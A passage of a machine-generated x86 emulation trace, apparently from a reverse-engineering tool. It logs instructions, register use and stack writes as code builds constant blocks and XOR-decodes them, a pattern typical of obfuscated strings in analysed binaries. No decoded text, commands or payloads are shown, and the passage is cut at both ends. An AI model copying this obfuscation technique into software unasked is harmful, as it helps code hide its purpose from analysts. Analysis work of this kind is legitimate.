0x81d0 for stack size 0x10000 0x46009d: mov dword ptr [esp + 0x30], 0x50e9e0c7, regs_read: [30], regs_write: () adjusting stack for ESP -0x60 and offset 0x8030 for stack size 0x10000 saving data to stack: 1357504711 4 0x4600a5: mov ecx, esi, regs_read: [29], regs_write: [22] 0x4600a7: mov dword ptr [esp + 0x34], 0x350c2281, regs_read: [30], regs_write: () adjusting stack for ESP -0x60 and offset 0x8034 for stack size 0x10000 saving data to stack: 889987713 4 0x4600af: mov dword ptr [esp + 0x38], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x60 and offset 0x8038 for stack size 0x10000 saving data to stack: 929680980 4 0x4600b7: mov dword ptr [esp + 0x3c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x60 and offset 0x803c for stack size 0x10000 saving data to stack: 1389027477 4 0x4600bf: pxor xmm1, xmmword ptr [esp + 0x30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x60 and offset 0x8030 for stack size 0x10000 0x4600c5: push eax, regs_read: [30, 19], regs_write: [30] 0x4600c6: movaps xmmword ptr [esp + 0x34], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x64 and offset 0x8034 for stack size 0x10000 saving data to stack: 28548172593721968 16 0x4600d9: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x4600de: mov dword ptr [esp + 0x10], 0x50e9e0c7, regs_read: [30], regs_write: () adjusting stack for ESP -0x64 and offset 0x8010 for stack size 0x10000 saving data to stack: 1357504711 4 0x4600e6: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x4600eb: mov dword ptr [esp + 0x18], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x64 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x4600ef: mov dword ptr [esp + 0x1c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x64 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x4600f3: mov dword ptr [esp + 0x14], 0x350c2281, regs_read: [30], regs_write: () adjusting stack for ESP -0x64 and offset 0x8014 for stack size 0x10000 saving data to stack: 889987713 4 0x4600fb: movaps xmm1, xmmword ptr [esp + 0x10], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x64 and offset 0x8010 for stack size 0x10000 0x460100: mov dword ptr [esp + 0x1e8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x64 and offset 0x81e8 for stack size 0x10000 saving data to stack: 929680980 4 0x460107: mov ecx, esi, regs_read: [29], regs_write: [22] 0x460109: mov dword ptr [esp + 0x1ec], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x64 and offset 0x81ec for stack size 0x10000 saving data to stack: 1389027477 4 0x460114: mov dword ptr [esp + 0x1e0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x64 and offset 0x81e0 for stack size 0x10000 saving data to stack: 914789047 4 0x46011f: mov dword ptr [esp + 0x1e4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x64 and offset 0x81e4 for stack size 0x10000 saving data to stack: 896093928 4 0x46012a: pxor xmm1, xmmword ptr [esp + 0x1e0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x64 and offset 0x81e0 for stack size 0x10000 0x460133: push eax, regs_read: [30, 19], regs_write: [30] 0x460134: movaps xmmword ptr [esp + 0x14], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x68 and offset 0x8014 for stack size 0x10000 saving data to stack: 28548172593721968 16 0x460145: push ecx, regs_read: [30, 22], regs_write: [30] 0x460146: mov ecx, eax, regs_read: [19], regs_write: [22] 0x46014d: push dword ptr [esp + 0x144], regs_read: [30], regs_write: [30] 0x46015b: push dword ptr [esp + 0x144], regs_read: [30], regs_write: [30] 0x46017f: push 0x10, regs_read: [30], regs_write: [30] 0x460181: pop eax, regs_read: [30], regs_write: [30, 19] 0x4601b4: mov dword ptr [esp + 0x94], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x74 and offset 0x8094 for stack size 0x10000 saving data to stack: 929680980 4 0x4601d9: mov eax, dword ptr [esp + 8], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x74 and offset 0x8008 for stack size 0x10000 0x4601dd: mov ecx, eax, regs_read: [19], regs_write: [22] 0x4601eb: mov ecx, dword ptr [esp + 0x94], regs_read: [30], regs_write: [22] adjusting stack for ESP -0x74 and offset 0x8094 for stack size 0x10000 0x4601f4: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x4601f6: mov dword ptr [esp + 0x50], 0x59f2c1bd, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8050 for stack size 0x10000 saving data to stack: 1509081533 4 0x4601fe: mov dword ptr [esp + 0x54], 0x500e2f9a, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8054 for stack size 0x10000 saving data to stack: 1343106970 4 0x460206: mov dword ptr [esp + 0x58], 0x444cee6e, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8058 for stack size 0x10000 saving data to stack: 1145892462 4 0x46020e: mov dword ptr [esp + 0x5c], 0x21efbbb5, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x805c for stack size 0x10000 saving data to stack: 569359285 4 0x460216: mov dword ptr [esp + 0x60], 0x205dc154, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8060 for stack size 0x10000 saving data to stack: 543015252 4 0x46021e: mov dword ptr [esp + 0x64], 0xa1dfa752, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8064 for stack size 0x10000 saving data to stack: 2715789138 4 0x460226: mov dword ptr [esp + 0x68], 0x4db42015, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8068 for stack size 0x10000 saving data to stack: 1303650325 4 0x46022e: mov dword ptr [esp + 0x6c], 0x5f02419c, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x806c for stack size 0x10000 saving data to stack: 1593983388 4 0x460236: mov dword ptr [esp + 0x70], 0x2998587b, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8070 for stack size 0x10000 saving data to stack: 697849979 4 0x46023e: mov dword ptr [esp + 0x74], 0x1831374, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8074 for stack size 0x10000 saving data to stack: 25367412 4 0x460246: mov dword ptr [esp + 0x78], 0xef7ba0ff, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8078 for stack size 0x10000 saving data to stack: 4017856767 4 0x46024e: mov dword ptr [esp + 0x7c], 0x5ab361db, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x807c for stack size 0x10000 saving data to stack: 1521705435 4 0x460256: mov dword ptr [esp + 0x80], 0x495cb5d7, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8080 for stack size 0x10000 saving data to stack: 1230812631 4 0x460261: mov dword ptr [esp + 0x84], 0xa0ce46da, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8084 for stack size 0x10000 saving data to stack: 2697873114 4 0x46026c: mov dword ptr [esp + 0x88], 0xdbf0b70a, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8088 for stack size 0x10000 saving data to stack: 3689985802 4 0x460277: mov dword ptr [esp + 0x8c], 0xfaf5f097, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x808c for stack size 0x10000 saving data to stack: 4210421911 4 0x460282: movaps xmm1, xmmword ptr [esp + 0x50], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x74 and offset 0x8050 for stack size 0x10000 0x460287: push ecx, regs_read: [30, 22], regs_write: [30] 0x460288: mov dword ptr [esp + 0xa4], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x78 and offset 0x80a4 for stack size 0x10000 saving data to stack: 914789047 4 0x460293: mov dword ptr [esp + 0xa8], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x78 and offset 0x80a8 for stack size 0x10000 saving data to stack: 896093928 4 0x46029e: mov dword ptr [esp + 0xac], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x78 and offset 0x80ac for stack size 0x10000 saving data to stack: 929680980 4 0x4602a9: mov dword ptr [esp + 0xb0], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x78 and offset 0x80b0 for stack size 0x10000 saving data to stack: 1389027477 4 0x4602b4: pxor xmm1, xmmword ptr [esp + 0xa4], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x78 and offset 0x80a4 for stack size 0x10000 0x4602bd: movaps xmmword ptr [esp + 0x54], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x78 and offset 0x8054 for stack size 0x10000 saving data to stack: 153055182769241905342386770840864969482 16 0x4602c2: movaps xmm1, xmmword ptr [esp + 0x64], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x78 and offset 0x8064 for stack size 0x10000 0x4602c7: push edx, regs_read: [30, 24], regs_write: [30] 0x4602c8: mov dword ptr [esp + 0xb8], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP -0x7c and offset 0x80b8 for stack size 0x10000 saving data to stack: 1913178889 4 0x4602d3: mov dword ptr [esp + 0xbc], 0x84ff9d1e, regs_read: [30], regs_write: () adjusting stack for ESP -0x7c and offset 0x80bc for stack size 0x10000 saving data to stack: 2231344414 4 0x4602de: mov dword ptr [esp + 0xc0], 0x22f82a66, regs_read: [30], regs_write: () adjusting stack for ESP -0x7c and offset 0x80c0 for stack size 0x10000 saving data to stack: 586689126 4 0x4602e9: mov dword ptr [esp + 0xc4], 0x656c28fb, regs_read: [30], regs_write: () adjusting stack for ESP -0x7c and offset 0x80c4 for stack size 0x10000 saving data to stack: 1701587195 4 0x4602f4: pxor xmm1, xmmword ptr [esp + 0xb8], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x7c and offset 0x80b8 for stack size 0x10000 0x4602fd: movaps xmmword ptr [esp + 0x68], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x7c and offset 0x8068 for stack size 0x10000 saving data to stack: 77668514257917837862356064585796356701 16 0x460302: movaps xmm1, xmmword ptr [esp + 0x78], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x7c and offset 0x8078 for stack size 0x10000 0x460307: push esi, regs_read: [30, 29], regs_write: [30] 0x460308: push edi, regs_read: [30, 23], regs_write: [30] 0x460309: mov edi, dword ptr [esp + 0x3c], regs_read: [30], regs_write: [23] adjusting stack for ESP -0x84 and offset 0x803c for stack size 0x10000 0x46030d: mov dword ptr [esp + 0xd0], 0x23eb7d5b, regs_read: [30], regs_write: () adjusting stack for ESP -0x84 and offset 0x80d0 for stack size 0x10000 saving data to stack: 602635611 4 0x460318: mov dword ptr [esp + 0xd4], 0x72f07224, regs_read: [30], regs_write: () adjusting stack for ESP -0x84 and offset 0x80d4 for stack size 0x10000 saving data to stack: 1928360484 4 0x460323: mov dword ptr [esp + 0xd8], 0x8b09cf88, regs_read: [30], regs_write: () adjusting stack for ESP -0x84 and offset 0x80d8 for stack size 0x10000 saving data to stack: 2332675976 4 0x46032e: mov dword ptr [esp + 0xdc], 0x299641e1, regs_read: [30], regs_write: () adjusting stack for ESP -0x84 and offset 0x80dc for stack size 0x10000 saving data to stack: 697713121 4 0x460339: pxor xmm1, xmmword ptr [esp + 0xd0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x84 and offset 0x80d0 for stack size 0x10000 0x460342: push eax, regs_read: [30, 19], regs_write: [30] 0x460343: movaps xmmword ptr [esp + 0x84], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x88 and offset 0x8084 for stack size 0x10000 saving data to stack: 153053988162458701598710404867545048352 16 0x46034f: movaps xmm1, xmmword ptr [esp + 0x94], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x88 and offset 0x8094 for stack size 0x10000 0x460357: mov dword ptr [esp + 0xe4], 0x495cbfdd, regs_read: [30], regs_write: () adjusting stack for ESP -0x88 and offset 0x80e4 for stack size 0x10000 saving data to stack: 1230815197 4 0x460362: mov dword ptr [esp + 0xe8], 0xa0ce46da, regs_read: [30], regs_write: () adjusting stack for ESP -0x88 and offset 0x80e8 for stack size 0x10000 saving data to stack: 2697873114 4 0x46036d: mov dword ptr [esp + 0xec], 0xdbf0b70a, regs_read: [30], regs_write: () adjusting stack for ESP -0x88 and offset 0x80ec for stack size 0x10000 saving data to stack: 3689985802 4 0x460378: mov dword ptr [esp + 0xf0], 0xfaf5f097, regs_read: [30], regs_write: () adjusting stack for ESP -0x88 and offset 0x80f0 for stack size 0x10000 saving data to stack: 4210421911 4 0x460383: pxor xmm1, xmmword ptr [esp + 0xe4], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x88 and offset 0x80e4 for stack size 0x10000 0x46038c: push eax, regs_read: [30, 19], regs_write: [30] 0x46038d: push edi, regs_read: [30, 23], regs_write: [30] 0x46038e: movaps xmmword ptr [esp + 0x9c], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x90 and offset 0x809c for stack size 0x10000 saving data to stack: 2570 16 0x4603de: push eax, regs_read: [30, 19], regs_write: [30] 0x4603f9: mov eax, dword ptr [esp + 0xc], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x94 and offset 0x800c for stack size 0x10000 0x460413: mov esi, 0x4f05e0, regs_read: (), regs_write: [29] 0x460418: mov ecx, esi, regs_read: [29], regs_write: [22] 0x46043a: mov ecx, esi, regs_read: [29], regs_write: [22] 0x460441: mov eax, dword ptr [esp + 0x98], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x94 and offset 0x8098 for stack size 0x10000 0x460448: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x46044a: mov dword ptr [esp + 0xc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x94 and offset 0x800c for stack size 0x10000 saving data to stack: 1685221239 4 0x460456: mov dword ptr [esp + 8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x94 and offset 0x8008 for stack size 0x10000 saving data to stack: 1685221239 4 0x460464: mov ecx, esi, regs_read: [29], regs_write: [22] 0x460466: push eax, regs_read: [30, 19], regs_write: [30] 0x460473: mov ecx, esi, regs_read: [29], regs_write: [22] 0x460475: push eax, regs_read: [30, 19], regs_write: [30] 0x460482: push eax, regs_read: [30, 19], regs_write: [30] 0x460497: mov esi, 0x368692b7, regs_read: (), regs_write: [29] 0x46049c: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x4604a1: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x4604a6: mov dword ptr [esp + 0x40], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8040 for stack size 0x10000 saving data to stack: 914789047 4 0x4604aa: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x4604af: mov dword ptr [esp + 0x44], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8044 for stack size 0x10000 saving data to stack: 896093928 4 0x4604b3: mov dword ptr [esp + 0x48], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8048 for stack size 0x10000 saving data to stack: 929680980 4 0x4604b7: mov dword ptr [esp + 0x4c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xa0 and offset 0x804c for stack size 0x10000 saving data to stack: 1389027477 4 0x4604bb: mov dword ptr [esp + 0x1d0], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xa0 and offset 0x81d0 for stack size 0x10000 saving data to stack: 914789047 4 0x4604c2: mov dword ptr [esp + 0x1d4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xa0 and offset 0x81d4 for stack size 0x10000 saving data to stack: 896093928 4 0x4604c9: mov dword ptr [esp + 0x1d8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xa0 and offset 0x81d8 for stack size 0x10000 saving data to stack: 929680980 4 0x4604d0: mov dword ptr [esp + 0x1dc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xa0 and offset 0x81dc for stack size 0x10000 saving data to stack: 1389027477 4 0x4604d7: mov dword ptr [esp + 0x1b0], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xa0 and offset 0x81b0 for stack size 0x10000 saving data to stack: 914789047 4 0x4604de: mov dword ptr [esp + 0x1b4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xa0 and offset 0x81b4 for stack size 0x10000 saving data to stack: 896093928 4 0x4604e5: mov dword ptr [esp + 0x1b8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xa0 and offset 0x81b8 for stack size 0x10000 saving data to stack: 929680980 4 0x4604ec: mov dword ptr [esp + 0x1bc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xa0 and offset 0x81bc for stack size 0x10000 saving data to stack: 1389027477 4 0x4604f3: mov dword ptr [esp + 0x190], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8190 for stack size 0x10000 saving data to stack: 914789047 4 0x4604fa: mov dword ptr [esp + 0x194], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8194 for stack size 0x10000 saving data to stack: 896093928 4 0x460501: mov dword ptr [esp + 0x198], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8198 for stack size 0x10000 saving data to stack: 929680980 4 0x460508: mov dword ptr [esp + 0x19c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xa0 and offset 0x819c for stack size 0x10000 saving data to stack: 1389027477 4 0x46051b: push 0x4dc50f, regs_read: [30], regs_write: [30] 0x460527: mov esi, eax, regs_read: [19], regs_write: [29] 0x46052e: push 0x4dc51d, regs_read: [30], regs_write: [30] 0x46053f: push 0x4dc51e, regs_read: [30], regs_write: [30] 0x460550: push 0x4dc51f, regs_read: [30], regs_write: [30] 0x460561: movaps xmm1, xmmword ptr [esp + 0x40], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xb0 and offset 0x8040 for stack size 0x10000 0x46056a: mov dword ptr [esp + 0x10], 0x36eae0c2, regs_read: [30], regs_write: () adjusting stack for ESP -0xb0 and offset 0x8010 for stack size 0x10000 saving data to stack: 921362626 4 0x460572: mov ecx, esi, regs_read: [29], regs_write: [22] 0x460574: mov dword ptr [esp + 0x14], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xb0 and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x46057c: mov dword ptr [esp + 0x18], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0xb0 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x460584: mov dword ptr [esp + 0x1c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0xb0 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x46058c: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xb0 and offset 0x8010 for stack size 0x10000 0x460592: push eax, regs_read: [30, 19], regs_write: [30] 0x460593: movaps xmmword ptr [esp + 0x14], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xb4 and offset 0x8014 for stack size 0x10000 saving data to stack: 159193624875848114666356121793116921982 16 0x4605a6: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x4605ab: mov dword ptr [esp + 0x1e0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xb4 and offset 0x81e0 for stack size 0x10000 saving data to stack: 914789047 4 0x4605b6: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x4605bb: mov dword ptr [esp + 0x1e4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xb4 and offset 0x81e4 for stack size 0x10000 saving data to stack: 896093928 4 0x4605c2: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x4605c7: mov dword ptr [esp + 0x1e8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xb4 and offset 0x81e8 for stack size 0x10000 saving data to stack: 929680980 4 0x4605ce: mov dword ptr [esp + 0x1ec], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xb4 and offset 0x81ec for stack size 0x10000 saving data to stack: 1389027477 4 0x4605d5: movaps xmm1, xmmword ptr [esp + 0x1e0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xb4 and offset 0x81e0 for stack size 0x10000 0x4605dd: mov dword ptr [esp + 0x3c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xb4 and offset 0x803c for stack size 0x10000 saving data to stack: 1389027477 4 0x4605e5: mov dword ptr [esp + 0x38], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xb4 and offset 0x8038 for stack size 0x10000 saving data to stack: 929680980 4 0x4605e9: mov ecx, esi, regs_read: [29], regs_write: [22] 0x4605eb: mov dword ptr [esp + 0x30], 0x36eae0c2, regs_read: [30], regs_write: () adjusting stack for ESP -0xb4 and offset 0x8030 for stack size 0x10000 saving data to stack: 921362626 4 0x4605f3: mov dword ptr [esp + 0x34], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xb4 and offset 0x8034 for stack size 0x10000 saving data to stack: 896093928 4 0x4605f7: pxor xmm1, xmmword ptr [esp + 0x30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xb4 and offset 0x8030 for stack size 0x10000 0x4605fd: push eax, regs_read: [30, 19], regs_write: [30] 0x4605fe: movaps xmmword ptr [esp + 0x34], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xb8 and offset 0x8034 for stack size 0x10000 saving data to stack: 7107189 16 0x46060f: push ecx, regs_read: [30, 22], regs_write: [30] 0x460610: mov ecx, eax, regs_read: [19], regs_write: [22] 0x460617: push dword ptr [esp + 0x144], regs_read: [30], regs_write: [30] 0x460625: push dword ptr [esp + 0x144], regs_read: [30], regs_write: [30] 0x460631: mov dword ptr [esp + 0x130], 0x5fe1fddb, regs_read: [30], regs_write: () adjusting stack for ESP -0xc4 and offset 0x8130 for stack size 0x10000 saving data to stack: 1608646107 4 0x460643: mov dword ptr [esp + 0x134], 0x35694e86, regs_read: [30], regs_write: () adjusting stack for ESP -0xc4 and offset 0x8134 for stack size 0x10000 saving data to stack: 896093830 4 0x46064e: mov ecx, esi, regs_read: [29], regs_write: [22] 0x460650: mov dword ptr [esp + 0x138], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0xc4 and offset 0x8138 for stack size 0x10000 saving data to stack: 929680980 4 0x46065b: mov dword ptr [esp + 0x13c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0xc4 and offset 0x813c for stack size 0x10000 saving data to stack: 1389027477 4 0x460666: movaps xmm0, xmmword ptr [esp + 0x130], regs_read: [30], regs_write: [122] adjusting stack for ESP -0xc4 and offset 0x8130 for stack size 0x10000 0x46066e: pxor xmm0, xmmword ptr [esp + 0x1d0], regs_read: [122, 30], regs_write: [122] adjusting stack for ESP -0xc4 and offset 0x81d0 for stack size 0x10000 0x460677: push eax, regs_read: [30, 19], regs_write: [30] 0x460678: movaps xmmword ptr [esp + 0x134], xmm0, regs_read: [30, 122], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8134 for stack size 0x10000 saving data to stack: 135099320244714391247415711832862888203 16 0x46068e: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x460693: mov dword ptr [esp + 0x120], 0x5fe1fddb, regs_read: [30], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8120 for stack size 0x10000 saving data to stack: 1608646107 4 0x46069e: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x4606a3: mov dword ptr [esp + 0x128], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8128 for stack size 0x10000 saving data to stack: 929680980 4 0x4606aa: mov dword ptr [esp + 0x12c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc8 and offset 0x812c for stack size 0x10000 saving data to stack: 1389027477 4 0x4606b1: mov dword ptr [esp + 0x124], 0x35694e86, regs_read: [30], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8124 for stack size 0x10000 saving data to stack: 896093830 4 0x4606bc: movaps xmm1, xmmword ptr [esp + 0x120], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xc8 and offset 0x8120 for stack size 0x10000 0x4606c4: mov dword ptr [esp + 0x1c8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc8 and offset 0x81c8 for stack size 0x10000 saving data to stack: 929680980 4 0x4606cb: mov ecx, esi, regs_read: [29], regs_write: [22] 0x4606cd: mov dword ptr [esp + 0x1cc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc8 and offset 0x81cc for stack size 0x10000 saving data to stack: 1389027477 4 0x4606db: mov dword ptr [esp + 0x1c0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xc8 and offset 0x81c0 for stack size 0x10000 saving data to stack: 914789047 4 0x4606e6: mov dword ptr [esp + 0x1c4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xc8 and offset 0x81c4 for stack size 0x10000 saving data to stack: 896093928 4 0x4606f1: pxor xmm1, xmmword ptr [esp + 0x1c0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xc8 and offset 0x81c0 for stack size 0x10000 0x4606fa: push eax, regs_read: [30, 19], regs_write: [30] 0x4606fb: movaps xmmword ptr [esp + 0x124], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xcc and offset 0x8124 for stack size 0x10000 saving data to stack: 474214788972 16 0x46070f: push ecx, regs_read: [30, 22], regs_write: [30] 0x460710: mov ecx, eax, regs_read: [19], regs_write: [22] 0x460717: push dword ptr [esp + 0x16c], regs_read: [30], regs_write: [30] 0x460725: push dword ptr [esp + 0x16c], regs_read: [30], regs_write: [30] 0x460731: movaps xmm1, xmmword ptr [esp + 0x1b0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xd8 and offset 0x81b0 for stack size 0x10000 0x460740: mov dword ptr [esp + 0x110], 0x45f5f3c7, regs_read: [30], regs_write: () adjusting stack for ESP -0xd8 and offset 0x8110 for stack size 0x10000 saving data to stack: 1173746631 4 0x46074b: mov ecx, esi, regs_read: [29], regs_write: [22] 0x46074d: mov dword ptr [esp + 0x114], 0x511b219f, regs_read: [30], regs_write: () adjusting stack for ESP -0xd8 and offset 0x8114 for stack size 0x10000 saving data to stack: 1360732575 4 0x460758: mov dword ptr [esp + 0x118], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0xd8 and offset 0x8118 for stack size 0x10000 saving data to stack: 929680980 4 0x460763: mov dword ptr [esp + 0x11c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0xd8 and offset 0x811c for stack size 0x10000 saving data to stack: 1389027477 4 0x46076e: pxor xmm1, xmmword ptr [esp + 0x110], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xd8 and offset 0x8110 for stack size 0x10000 0x460777: push eax, regs_read: [30, 19], regs_write: [30] 0x460778: movaps xmmword ptr [esp + 0x114], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xdc and offset 0x8114 for stack size 0x10000 saving data to stack: 72736612705571155656289148959654911152 16 0x46078e: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x460793: mov dword ptr [esp + 0x100], 0x45f5f3c7, regs_read: [30], regs_write: () adjusting stack for ESP -0xdc and offset 0x8100 for stack size 0x10000 saving data to stack: 1173746631 4 0x46079e: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x4607a3: mov dword ptr [esp + 0x108], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xdc and offset 0x8108 for stack size 0x10000 saving data to stack: 929680980 4 0x4607aa: mov dword ptr [esp + 0x10c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xdc and offset 0x810c for stack size 0x10000 saving data to stack: 1389027477 4 0x4607b1: mov dword ptr [esp + 0x104], 0x511b219f, regs_read: [30], regs_write: () adjusting stack for ESP -0xdc and offset 0x8104 for stack size 0x10000 saving data to stack: 1360732575 4 0x4607bc: movaps xmm1, xmmword ptr [esp + 0x100], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xdc and offset 0x8100 for stack size 0x10000 0x4607c4: mov dword ptr [esp + 0x1a8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xdc and offset 0x81a8 for stack size 0x10000 saving data to stack: 929680980 4 0x4607cb: mov ecx, esi, regs_read: [29], regs_write: [22] 0x4607cd: mov dword ptr [esp + 0x1ac], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xdc and offset 0x81ac for stack size 0x10000 saving data to stack: 1389027477 4 0x4607db: mov dword ptr [esp + 0x1a0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xdc and offset 0x81a0 for stack size 0x10000 saving data to stack: 914789047 4 0x4607e6: mov dword ptr [esp + 0x1a4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xdc and offset 0x81a4 for stack size 0x10000 saving data to stack: 896093928 4 0x4607f1: pxor xmm1, xmmword ptr [esp + 0x1a0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xdc and offset 0x81a0 for stack size 0x10000 0x4607fa: push eax, regs_read: [30, 19], regs_write: [30] 0x4607fb: movaps xmmword ptr [esp + 0x104], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xe0 and offset 